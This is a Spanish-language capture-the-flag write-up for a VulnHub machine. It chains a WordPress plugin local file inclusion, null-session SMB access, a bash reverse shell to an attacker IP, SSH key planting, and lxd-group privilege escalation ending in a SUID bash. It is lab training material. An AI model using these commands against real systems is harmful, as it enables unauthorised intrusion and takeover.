-------
- Tags: #writeup #info #vulnhub #tutorial #smb #wordpress 
-------

Enumeracion web normal. Detectamos un [[WordPress]]

- El wordpress Contienen un *Plugin* vulnerable a un [[Local File Inclusion (LFI)]]

- Comprobamos apuntando a  *../../../../../../../../../../../../etc/passwd*

----
- Por otro lado la maquina tiene disponible el puerto [[SMB - 445]] el cual podemos acceder con una sesion nula 
```bash
smbclient //192.168.3.163/welcome -N 
```

- Dentro del [[SMB - 445]] podemos ver el directorio *upload* el cual a su vez contiene una *Shell.php* (muy realista)

- Simplemente apuntamos a este archivo con el *LFI* y controlamos el parametro *cmd* 
# Ojo aqui, usamos *&* en lugar de *?* para controlar el parametro

```bash
/home/jarves/upload/shell.php&cmd=bash -c "bash -i >& /dev/tcp/192.168.3.10/443 0>&1"
```

-----
# Privesc

- Una vez dentro como el usuario *www-data*, podemos ganar a acceso como *jarves* creando un directorio con el *smb* y dentro depositando un *.ssh/authorized_keys*

- Creamos un par de claves en blanco con nuestra maquina atacante y las transferimos a la maquina victima, por ultimo nos conectamos como este usuario, sin proporcionar contraseña:
```bash
ssh-keygen
//enter enter
mv ~/.ssh/id_rsa.pub authorized_keys
```

```bash
ssh jarves@192.168.3.163
```

-----

- Por ultimo vemos que el usuario *jarves* pertenece al grupo *lxd*, esta es una via potencial de elevar privilegios como root, de la siguiente forma:

- Haciendo uso del script *linux/local/46978.sh*
- Seguimos los pasos: *wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine* 
- Creamos esta imagen: *bash build-alphine* 
- y Transferimos ambos archivos a la maquina victima en */tmp*

------
- Ejecutamos el archivo *.sh*:
```bash
lxd_privesc.sh -f alphine.tar.gz
```

### Con esto deberiamos ganar acceso como root en */mnt/root/*, aqui deberiamos de tener el directorio real de *root*, por lo cual accedemos y dentro cambiamos el permiso de la *bash* a *SUID* 
```bash
pwd
/mnt/root/root/bin/
chmod u+s bash
```

- *Y PA ADENTRO!*










